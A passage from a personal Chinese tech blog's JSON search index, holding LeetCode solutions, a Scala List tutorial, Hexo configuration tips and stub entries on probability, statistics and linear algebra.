Seats","updated":"2020-07-19T00:23:28.017Z","tags":[{"name":"mysql","slug":"mysql","permalink":"http://xwolf191.github.io/tags/mysql/"},{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"627. Swap Salary","date":"2018-08-10T09:20:00.000Z","path":"2018/08/10/数据库/mysql/leetcode/Swap Salary/","text":"Given a table salary, such as the one below, that has m=male and f=female values. Swap all f and m values (i.e., change all f values to m and vice versa) with a single update query and no intermediate temp table. For example: id name sex salary 1 A m 2500 2 B f 1500 3 C m 5500 4 D f 500 After running your query, the above salary table should have the following rows: id name sex salary 1 A f 2500 2 B m 1500 3 C f 5500 4 D m 500 题意解读写一个SQL交换性别信息,不能生成临时表。用子查询的话会生成临时表,自然就能想到用CASE WHEN实现。 实现 mysql 1UPDATE salary SET sex = case when sex='f' then 'm' else 'f' end ; 1update salary set sex = CHAR(ASCII('f') ^ ASCII('m') ^ ASCII(sex)); 参考 627. Swap Salary","updated":"2020-07-19T00:23:28.017Z","tags":[{"name":"mysql","slug":"mysql","permalink":"http://xwolf191.github.io/tags/mysql/"},{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"77. Combinations","date":"2018-08-10T01:20:00.000Z","path":"2018/08/10/数据结构和算法/leetcode/Combinations/","text":"Given two integers n and k, return all possible combinations of k numbers out of 1 … n。Example:Input: n = 4, k = 2Output:[ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4],] 题意描述给定两个int数字n,k。 返回所有1到n之间的k个数字的所有组合。解题思路类似数学中的排列组合,$C^k_n=\\frac{n!}{k!(n-k)!}$ 实现 scala 12 参考资料 combinations Combination wiki","updated":"2020-07-19T00:23:28.024Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"hexo插入本地图片","date":"2018-08-09T23:15:00.000Z","path":"2018/08/10/开发工具/hexo插入本地图片/","text":"加载网络图片就不多说了,主要说一下hexo怎么加载本地的图片。 配置安装插件1npm install hexo-asset-image --save 环境配置修改根_config.yml文件： 1post_asset_folder:true 在source/_post中,创建和文章标题一样的同级目录,引入图片即可。 1![](hexo_dog_1.jpg) 遇到的问题The request content cannot loaded 这种情况是图片路径没找到,检查目录是否和标题一样,是否是同级目录,图片名称是否正确。","updated":"2020-07-19T00:23:27.970Z","tags":[{"name":"hexo","slug":"hexo","permalink":"http://xwolf191.github.io/tags/hexo/"}]},{"title":"70. Climbing Stairs","date":"2018-08-08T07:45:00.000Z","path":"2018/08/08/数据结构和算法/leetcode/Climbing Stairs/","text":"You are climbing a stair case. It takes n steps to reach to the top. Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top? Note: Given n will be a positive integer. Example 1:Input: 2Output: 2Explanation: There are two ways to climb to the top. 1 step + 1 step 2 steps Example 2:Input: 3Output: 3Explanation: There are three ways to climb to the top. 1 step + 1 step + 1 step 1 step + 2 steps 2 steps + 1 step 题目描述爬楼梯,一次只能爬1或2阶,问有多少种方法爬到楼梯顶。首先,当n=1时,f(1)=1;当n=2时,f(2) = 2… 发现 f(n) = f(n-1)+f(n-2)就是斐波那契数列的第n项的值。典型的求解过程就是递归。此题的讨论页面有根据矩阵求解、典型的动态规划等,具体参考此题的solution tab页面。 实现 scala 12345def climbStairs(n: Int): Int = &#123; if (n == 1) return 1 if (n == 2) return 2 climbStairs(n-1) + climbStairs(n-2) &#125; 参考 Climbing Stairs 斐波那契数列","updated":"2020-07-19T00:23:28.024Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"scala集合之List","date":"2018-08-06T15:40:00.000Z","path":"2018/08/06/scala/scala集合之List/","text":"文章以scala 2.12.6版本为例来使用scala。由于scala的List有很多丰富强大的功能,本文来列举部分常用的用法。 声明123456789101112131415161718192021 class ListDemo &#123; //定义方法、List def test1():Unit=&#123; //创建空列表 val nList =Nil println(nList) val mList =List() println(mList)//List() println(mList.eq(nList))//true //val 声明为不可变对象 val list =List(1,3,5,6) println(list) // List(1, 3, 5, 6) &#125;&#125;//scalatest 测试 test(\"List Define\")&#123; val listDemo = new ListDemo listDemo.test1() &#125; 追加元素123456789101112131415161718192021222324// :+,+:,::val list =List(1,3,5,6)println(list) // List(1,3,5,6)val b = 43val c = b +: listprintln(c)// List(43, 1, 3, 5, 6)val d = list :+ 33println(d)//List(1, 3, 5, 6, 33)println(list)//List(1, 3, 5, 6)val d_ = b :: listval d__ =d_ :: listprintln(d_)// List(43, 1, 3, 5, 6)println(d__)// List(List(43, 1, 3, 5, 6), 1, 3, 5, 6)// ++,++:,:::val e = list ++ cprintln(e)// List(1, 3, 5, 6, 43, 1, 3, 5, 6)val f = list ++: dprintln(f)// List(1, 3, 5, 6, 1, 3, 5, 6, 33)val g = d ++: listprintln(g)// List(1, 3, 5, 6, 33, 1, 3, 5, 6)val h = list ::: gprintln(h) // List(1, 3, 5, 6, 1, 3, 5, 6, 33, 1, 3, 5, 6) 说明 +: 前边参数是一个元素,追加到集合的前面,:+ 第一个参数是集合本身,将元素追加到集合的后边。:: 是将一个元素(可以是任意类型)追加到集合的头部。值得注意的是,集合操作不会改变原有集合的内容。 ++,++:,::: 是两个集合的拼接,会把两个集合的运算合并生成新的集合，原集合不变。 修改元素修改指定索引位置的元素12val i = h.updated(3,222)println(i) // List(1, 3, 5, 222, 1, 3, 5, 6, 33, 1, 3, 5, 6) 获取元素(集合)这部分的主要操作以构造的下面集合为例1val list = \"Java\" :: \"Scala\" :: \"Python\" :: Nil 获取指定索引的元素12list(0) // 取索引为0的元素list apply 2 // 取索引为2的元素,这两个方法是等效的 获取元素的索引123list.indexOf(\"S\")//-1list.indexOf(\"Scala\")//从指定位置开始查找,1 获取除最后一个元素外的集合1list.init// List(Java, Scala) 获取除第一个元素外的集合1list.init//List(Scala, Python) 获取最后一个元素1list.head//java 获取第一个元素1list.last//Python 从左边开始获取指定个数n的元素n小于0返回空集合 1list.take(2)//List(Java, Scala) 从右边开始获取指定个数n的元素n小于0返回空集合 1list.takeRight(2)//List(Java, Scala) 从开始位置获取满足指定条件的元素,直到不符合条件返回1list.takeWhile(_.startWith(\"J\"))//List(Java) 从获取满足指定条件的所有元素123list.filter(_.startWith(\"S\"))//List(Scala)//filterNot 和filter相反list.filterNot(_.startWith(\"S\"))//List(Julia, Java, Python) 找到第一个满足条件的集合1list.find(s =&gt; s.contains(\"J\"))//Some(Julia) 其他用法获取集合长度1list.length 删除元素删除指定个数个元素,返回删除后的新集合 1list.drop(2) 反转1list.reverse 取最大、最小值12list.maxlist.min 重复一个元素n次1List.fill(3)(\"ABC\")//List(ABC, ABC, ABC) map操作map 是将集合中的每一个元素处理,返回新的集合。 1234list.map(_+\"_01\")//List(Java_01, Scala_01, Python_01)list.map(s =&gt; Some(s.substring(0,2)))//List(Some(Ja), Some(Sc), Some(Py))list.map(m =&gt; List.fill(2)(m))//List(List(Java, Java), List(Scala, Scala), List(Python, Python)) flatMap操作flatMap是将所有集合中的所有元素拼接成一个新的集合1list.flatMap(m =&gt; List.fill(2)(m))//List(Java, Java, Scala, Scala, Python, Python) zip操作zip,zipAll 是将两个元素对应拼接成元组元素的集合 12345val b = (1 to 10).toListb.zip(list)//List((1,Java), (2,Scala), (3,Python))(list.zip(b)//List((Java,1), (Scala,2), (Python,3))list.zipAll(b,\"A\",2)//List((Java,1), (Scala,2), (Python,3), (A,4), (A,5), (A,6), (A,7), (A,8), (A,9), (A,10))(b.zipAll(list,\"B\",-1)//List((1,Java), (2,Scala), (3,Python), (4,-1), (5,-1), (6,-1), (7,-1), (8,-1), (9,-1), (10,-1)) fold操作fold中第一个参数是参与运算的初值,每次运算后将结果作为下一次运算的参数依次执行 123456789101112131415val list = (1 to 10).toListlist.fold(1)&#123; (x,y) =&gt; x*y &#125;list.foldLeft(0)&#123; (x,y) =&gt; x+ y &#125;list.foldRight(0)&#123; (x,y) =&gt; x+ y &#125; val a = (0 /: list) (_+_)// foldLeft的简化写法 val b = (list :\\ 0) (_+_) // foldRight的简化写法 reduce操作123456789101112131415val b = (1 to 10).toListlist.reduce(_+_)//55list.reduceLeft((a,b)=&gt; &#123; println(a,b); if (b %2 == 0) a else b &#125;)//(1,2)//(1,3)//(3,4)//(3,5)//(5,6)//(5,7)//(7,8)//(7,9)//(9,10) reduceLeft运算,将运算结果作为第一个参数参与到下次运算中。 参考 Scala 课堂! scala官网List","updated":"2020-07-19T00:23:27.901Z","tags":[{"name":"scala","slug":"scala","permalink":"http://xwolf191.github.io/tags/scala/"}]},{"title":"202. Happy Number","date":"2018-08-06T11:45:00.000Z","path":"2018/08/06/数据结构和算法/leetcode/Happy Number/","text":"Write an algorithm to determine if a number is “happy”.A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.Example:Input: 19Output: trueExplanation:1^2 + 9^2 = 828^2 + 2^2 = 686^2 + 8^2 = 1001^2 + 0^2 + 0^2 = 1 题目描述题意是写一个算法判断一个数字是一个幸福数字。幸福数字是由以下过程定义的数字：从任何正整数开始，将数字替换为其数字的平方和，并重复该过程，直到数字等于1（它将保留），或者循环在一个不包括1的循环中无休止地。这个过程以1结尾的那些数字是幸福的数字。 实现 java12345678910111213141516171819public boolean isHappy(int n) &#123; Set&lt;Integer&gt; inLoop = new HashSet&lt;Integer&gt;(); int squareSum,remain; while (inLoop.add(n)) &#123; squareSum = 0; while (n &gt; 0) &#123; remain = n%10; squareSum += remain*remain; n /= 10; &#125; if (squareSum == 1) return true; else n = squareSum; &#125; return false;&#125; 参考 Happy number(wiki) Happy Number","updated":"2020-07-19T00:23:28.026Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"14.Longest Common Prefix","date":"2018-08-06T09:20:00.000Z","path":"2018/08/06/数据结构和算法/leetcode/Longest Common Prefix/","text":"Write a function to find the longest common prefix string amongst an array of strings.If there is no common prefix, return an empty string “”.Example 1:Input: [“flower”,”flow”,”flight”]Output: “fl”Example 2:Input: [“dog”,”racecar”,”car”]Output: “”Explanation: There is no common prefix among the input strings.Note:All given inputs are in lowercase letters a-z. 题目描述此题意思是取给定数组中元素的最大长度公共前缀,找不到返回空字符串。题目很简单,但是中间有很多小问题不注意会出错,比如空数组,所有元素都相同。我的解题思路是遍历数组,依次取最长元素的前缀判断是否是最大公共前缀。 实现 scala 123456789101112131415161718192021222324252627282930313233343536373839def longestCommonPrefix(strs: Array[String]): String = &#123; // 是否空, if (strs==null || strs.length&lt;1 || strs.exists(p=&gt;p.trim.length==0))&#123; return \"\" &#125; //只有一个元素，直接返回 if (strs.length==1)&#123; return strs(0) &#125; //是否所有元素都相同 if (strs.toSet.size==1)&#123; return strs(0) &#125; //第一次取第一个元素的第一个字母 var prefix = strs(0).charAt(0).toString var r = \"\" var flag = true var j = 0 while (flag)&#123; val len = strs.length var rp = strs(0) for ( i&lt;-0 until len)&#123; if (flag)&#123; flag = strs(i).startsWith(prefix) //把最大长度元素作为下次循环的前缀处理元素 if (strs(i).length&gt;rp.length)&#123; rp = strs(i) &#125; &#125; &#125; if (flag)&#123; j = j+1 //最大长度元素截取 prefix = rp.substring(0,j) &#125; r = prefix &#125; r.substring(0,r.length-1) &#125; 评论区其他答案 python 这个方法很精妙 1234567891011121314151617def longestCommonPrefix(self, strs) -&gt; str: \"\"\" 查找公共最大子串 :param strs: List[str] :return: \"\"\" if not strs: return \"\" shortest = min(strs, key=len) for i, ch in enumerate(shortest): for other in strs: if other[i] != ch: return shortest[:i] return shortest 参考 Longest Common Prefix","updated":"2020-07-19T00:23:28.029Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"概率论基础一之组合分析","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础一之组合分析/","text":"排列组合从n个元素中取r个组成一组，一共有多少个不同的组？ 一般来说，如果考虑顺序的话一共有n(n-1)(n-2)…(n-r+1)个组,而每个含r个元素的小组都被重复记录了r!次.所以从n个元素中取r个组成不同组的数目为: \\frac{n(n-1)(n-2)...(n-r+1)}{r!} = \\frac{n!}{(n-r)!r!}对于r&lt;=n，我们定义$\\dbinom{n}{r}$如下: \\dbinom{n}{r} = \\frac{n!}{(n-r)!r!}这样就表示从n个元素中取r个的可能组合数. 值$\\dbinom{n}{r}$经常称为二项式系数,是因为它们是二项式定理中对的主要系数。 二项式定理 (x+y)^n = \\sum_{k=0}^n \\dbinom{n}{k} x^k y^{n-k} 例子: 展开$(x+y)^3$ 解: $ (x+y)^3 = \\dbinom{3}{0} x^0 y^{3} + \\dbinom{3}{1} x^1 y^{2} + \\dbinom{3}{2} x^2 y^{1} + \\dbinom{3}{3} x^3 y^{0} = y^{3} + 3xy^{2} + 3x^{2}y + x^{3} $ 多项式系数从n个元素中取r组,每组分别有 n_1,n_2,...n_r个元素,其中 \\sum_{i=0}^r n_i = n ,一共有多少种不同的分法？ 参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.981Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础四之随机变量","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础七之期望的性质/","text":"参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.981Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础三之条件概率和独立性","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础三之条件概率和独立性/","text":"参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.982Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础九之概率论的其他课题","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础九之概率论的其他课题/","text":"参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.982Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础二之概率论公理","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础二之概率论公理/","text":"(\\bigcup_{i=1}^n E_i)^c = \\bigcap_{i=1}^n E_i^c (\\bigcap_{i=1}^n E_i)^c = \\bigcup_{i=1}^n E_i^c参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.982Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础五之连续型随机变量","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础五之连续型随机变量/","text":"参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.983Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础八之极限定理","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础八之极限定理/","text":"参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.983Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础六之随机变量的联合分布","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础六之随机变量的联合分布/","text":"参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.983Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础十之模拟","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础十之模拟/","text":"参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.984Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"概率论基础四之随机变量","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/概率论基础四之随机变量/","text":"参考资料 概率论与数理统计 第四版 概率论基础教程(原书第9版)","updated":"2020-07-19T00:23:27.984Z","tags":[{"name":"概率论","slug":"概率论","permalink":"http://xwolf191.github.io/tags/概率论/"}]},{"title":"统计学一之统计学习方法概论","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学一之统计学习方法概论/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.006Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学七之支持向量机","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学七之支持向量机/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.007Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学三之k紧邻法","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学三之k紧邻法/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.007Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学九之EM算法及其推广","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学九之EM算法及其推广/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.008Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学二之感知机","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学二之感知机/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.008Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学五之决策树","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学五之决策树/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.009Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学八之提升方法","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学八之提升方法/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.009Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学六之逻辑斯谛回归与最大熵模型","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学六之逻辑斯谛回归与最大熵模型/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.009Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学十一之条件随机场","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学十一之条件随机场/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.010Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学十之隐马尔可夫模型","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学十之隐马尔可夫模型/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.011Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学四之朴素贝叶斯法","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学四之朴素贝叶斯法/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.011Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"统计学十二之统计学习方法总结","date":"2018-08-04T14:24:00.000Z","path":"2018/08/04/数学/统计学十二之统计学习方法总结/","text":"参考资料 统计学习方法(李航)","updated":"2020-07-19T00:23:28.011Z","tags":[{"name":"统计学","slug":"统计学","permalink":"http://xwolf191.github.io/tags/统计学/"}]},{"title":"唐多令·芦叶满汀洲","date":"2018-07-25T23:35:00.000Z","path":"2018/07/26/杂侃/唐多令·芦叶满汀洲/","text":"芦叶满汀洲，寒沙带浅流。二十年重过南楼。柳下系船犹未稳，能几日，又中秋。黄鹤断矶头，故人今在否？旧江山浑是新愁。欲买桂花同载酒，终不似，少年游。","updated":"2020-07-19T00:23:28.414Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"hexo集成plantuml","date":"2018-07-22T02:10:00.000Z","path":"2018/07/22/开发工具/hexo集成plantuml/","text":"安装命令行1npm install hexo-tag-plantuml --save 配置文件package.json中添加依赖12\"hexo-tag-plantuml\": \"^1.0.0\" 示例基本语法 用例图(use case) 12345678910&#123;% plantuml %&#125;用户 &lt;|-- 管理员top to bottom direction用户 --&gt; (用户查看)用户 --&gt; (角色查看)管理员 --&gt; (用户查看)管理员 --&gt; (角色查看)管理员 --&gt; (用户编辑)管理员 --&gt; (角色编辑)&#123;% endplantuml %&#125; 活动图(activity diagram) 1234567891011&#123;% plantuml %&#125;startif (用户是否登录?) then (是) :进入主菜单;else (否) :跳转登录;endifstop&#123;% endplantuml %&#125; 类图(class diagram) 12345678910111213141516171819202122232425262728293031323334&#123;% plantuml %&#125;abstract class AbstractList&#123; - final int offset; - int size; + E remove(int index) # void removeRange(int fromIndex, int toIndex)&#125;abstract AbstractCollectioninterface Listinterface Collection&#123; &#123;abstract&#125; int size() &#123;abstract&#125; boolean retainAll(Collection&lt;?&gt; c)&#125;List &lt;|-- AbstractListCollection &lt;|-- AbstractCollectionCollection &lt;|- ListAbstractCollection &lt;|- AbstractListAbstractList &lt;|-- ArrayListclass ArrayList &#123; Object[] elementData size()&#125;enum TimeUnit &#123; DAYS HOURS MINUTES&#125;annotation SuppressWarnings&#123;% endplantuml %&#125; 对象图(object diagram)123456789101112131415&#123;% plantuml %&#125;object Object01object Object02object Object03object Object04object Object05object Object06object Object07object Object08Object01 &lt;|-- Object02Object03 *-- Object04Object05 o-- &quot;4&quot; Object06Object07 .. Object08 : some labels&#123;% endplantuml %&#125; 时序图(sequence diagram) 1234567891011121314151617181920&#123;%plantuml %&#125;participant UserUser -&gt; A: DoWorkactivate AA -&gt; B: &lt;&lt; createRequest &gt;&gt;activate BB -&gt; C: DoWorkactivate CC --&gt; B: WorkDonedestroy CB --&gt; A: RequestCreateddeactivate BA -&gt; User: Donedeactivate A&#123;% endplantuml %&#125; 部署图(deployment diagram)1234567891011121314151617181920212223&#123;% plantuml %&#125;actor actoragent agentartifact artifactboundary boundarycard cardcloud cloudcomponent componentcontrol controldatabase databaseentity entityfile filefolder folderframe frameinterface interfacenode nodepackage packagequeue queuestack stackrectangle rectanglestorage storageusecase usecase&#123;% endplantuml %&#125; 参考资料 plantuml官网 详解UML图之类图","updated":"2020-07-19T00:23:27.972Z","tags":[{"name":"hexo","slug":"hexo","permalink":"http://xwolf191.github.io/tags/hexo/"}]},{"title":"hexo启动成功但是无法访问","date":"2018-07-22T02:00:00.000Z","path":"2018/07/22/开发工具/hexo启动成功但是无法访问/","text":"hexo s 启动本地服务后,无法访问。 杀掉进程查看默认的4000端口被别的应用程序占用,window可能是Fixservice(福昕阅读器)。 1netstat -ano|findstr 4000 强制杀掉指定PID的进程1taskkill /PID 8896 /F 修改端口 默认使用4000端口，用hexo s -p 8080，可以暂时修改启动端口。 但是每次启动都要写”-p 80”才行，过于繁琐。 修改方法：找到node_modules\\hexo-server\\index.js文件，可以修改默认的port值！","updated":"2020-07-19T00:23:27.969Z","tags":[{"name":"hexo","slug":"hexo","permalink":"http://xwolf191.github.io/tags/hexo/"}]},{"title":"线性代数七之数值线性代数","date":"2018-07-21T12:50:00.000Z","path":"2018/07/21/数学/线性代数七之数值线性代数/","text":"参考资料 线性代数Steven J Leon(原书第8版)","updated":"2020-07-19T00:23:27.986Z","tags":[{"name":"线代","slug":"线代","permalink":"http://xwolf191.github.io/tags/线代/"}]},{"title":"线性代数六之特征值","date":"2018-07-21T12:40:00.000Z","path":"2018/07/21/数学/线性代数六之特征值/","text":"参考资料 线性代数Steven J Leon(原书第8版)","updated":"2020-07-19T00:23:28.004Z","tags":[{"name":"线代","slug":"线代","permalink":"http://xwolf191.github.io/tags/线代/"}]},{"title":"线性代数五之正交性","date":"2018-07-21T12:30:00.000Z","path":"2018/07/21/数学/线性代数五之正交性/","text":"参考资料 线性代数Steven J Leon(原书第8版)","updated":"2020-07-19T00:23:28.004Z","tags":[{"name":"线代","slug":"线代","permalink":"http://xwolf191.github.io/tags/线代/"}]},{"title":"线性代数四之线性变换","date":"2018-07-21T12:20:00.000Z","path":"2018/07/21/数学/线性代数四之线性变换/","text":"参考资料 线性代数Steven J Leon(原书第8版)","updated":"2020-07-19T00:23:28.005Z","tags":[{"name":"线代","slug":"线代","permalink":"http://xwolf191.github.io/tags/线代/"}]},{"title":"hexo创建tags和categories","date":"2018-07-19T05:30:00.000Z","path":"2018/07/19/开发工具/hexo创建tags和categories/","text":"默认用 hexo next主题创建文章后,无标签和分类信息。点击菜单Cannot GET /tags/ 。 解决方法 123456789101112131415161718192021#进入工程目录cd your_hexo_project#创建页面,source/_post下会创建tags目录hexo new page \"tags\"#编辑页面vim tags/index.md#修改成如下内容后保存---title: tagsdate: 2018-07-19 13:30type: \"tags\"---# 在theme/next/_config.yml添加tags到menu下menu:home: /archives: /archives/categories: /categories/tags: /tags/ 配置完成后,重新部署(hexo clean /hexo generate)后即可。 categories创建方法同上。 如有错误,欢迎批评指正,望不吝赐教!!!","updated":"2020-07-19T00:23:27.969Z","tags":[{"name":"hexo","slug":"hexo","permalink":"http://xwolf191.github.io/tags/hexo/"}]},{"title":"线性代数二之矩阵和方程组","date":"2018-07-15T01:30:00.000Z","path":"2018/07/15/数学/线性代数二之矩阵和方程组/","text":"数学上，一个 m×n 的矩阵是一个由 m 行（row）n 列（column）元素排列成的矩形阵列。矩阵里的元素可以是数字、符号或数学式。以下是一个由 6 个数字元素构成的 2 行 3 列的矩阵：$ \\begin{bmatrix}1 &amp; 9 &amp; -13 \\20 &amp; 5 &amp; -6 \\end{bmatrix} $。大小相同（行数列数都相同）的矩阵之间可以相互加减，具体是对每个位置上的元素做加减法。矩阵的乘法则较为复杂。两个矩阵可以相乘，当且仅当第一个矩阵的列数等于第二个矩阵的行数。矩阵的乘法满足结合律和分配律，但不满足交换律。 矩阵的一个重要用途是解线性方程组。线性方程组中未知量的系数可以排成一个矩阵，加上常数项，则称为增广矩阵。另一个重要用途是表示线性变换，即是诸如 f(x)=4x 之类的线性函数的推广。设定基底后，某个矢量 v 可以表示为 m×1 的矩阵，而线性变换 f 可以表示为列数为 m 的矩阵 A，使得经过变换后得到的矢量 f(v)可以表示成 Av 的形式。矩阵的特征值和特征矢量可以揭示线性变换的深层特性。 矩阵是高等代数学中的常见工具，也常见于统计分析等应用数学学科中。在物理学中，矩阵于力学、电路学、光学和量子物理中都有应用；计算机科学中，三维动画制作也需要用到矩阵。矩阵的运算是数值分析领域的重要问题。将矩阵分解为简单矩阵的组合可以在理论和实际应用上简化矩阵的运算。对一些应用广泛而形式特殊的矩阵，例如稀疏矩阵和准对角矩阵，有特定的快速运算算法。关于矩阵相关理论的发展和应用，请参考矩阵理论。在天体物理、量子力学等领域，也会出现无穷维的矩阵，是矩阵的一种推广。 线性方程组形如$ a1x_1+a_2x_2+…+a_nx_n=b $ 的方程称为含有 n 个未知量的线性方程,其中$ a_1,a_2,…a_n $ 和 b 为实数,$ x_1,x_2,…x_n $称为变量。含有 m 个方程和 n 个未知量的线性方程组定义为:$\\begin{cases}a{11}x1+a{12}x2+…+a{1n}x1=b_1 \\a{21}x1+a{22}x2+…+a{2n}x2=b_2 \\ {\\vdots} \\a{m1}x1+a{m2}x2+…+a{mn}x_n=b_m\\end{cases}$.线性方程组的所有解的集合称为方程组的解集。 定义若两个含有相同变量的方程组具有相同的解集,则称它们为等价的。 定义若方程组中,第 k 个方程的前 k-1 个变量的系数均为 0,且$x_k(k=1,2,3…n)$的系数都不为 0,则称这样的方程组为严格三角形的。 例 1求解方程组$\\begin{cases}3x_1 + 2x_2 + x_3 = 1 \\x_2 - x_3 = 2 \\2x_3=4\\end{cases}$. 很简单,回代法解此方程,先求解$x_3$,代入第二个方程,依次求解。求解后方程组的解为(-3,4,2)。 例 2 求解方程组$\\begin{cases}x_1 + 2x_2 + x_3 = 3 \\3x_1 - x_2 - 3x_3 = -1 \\2x_1 + 3x_2 + x_3 = 4\\end{cases}$。化简为严格三角形的方程组:$\\begin{cases}x_1 + 2x_2 + x_3 = 3 \\-7x_2 - 6x_3 = -10 \\-\\frac{1}{7}x_3= -\\frac{4}{7}\\end{cases}$,可得方程组的解集为(3,-2,4)。 可以把例 2 中的方程组同一个以系数$x_i$为元的$3\\times3$的数字阵列联系起来。$\\begin{bmatrix}1 &amp; 2 &amp; 1 \\3 &amp; -1 &amp; -3 \\2 &amp; 3 &amp; 1\\end{bmatrix}$ 称这个阵列为方程组的系数矩阵。一个 m 行 n 列的矩阵称为$m \\times n$矩阵。如果矩阵的行数和列数相等,即 m=n,则称该矩阵为方阵。如果在系数矩阵右边加一列方程组的右端项,得到一个新的矩阵 \\left [ \\begin {array} {cc|c} 1 & 2 & 1 & 3 \\\\ 3 & -1 & -3 & -1\\\\ 2 & 3 & 1 & 4 \\end {array} \\right 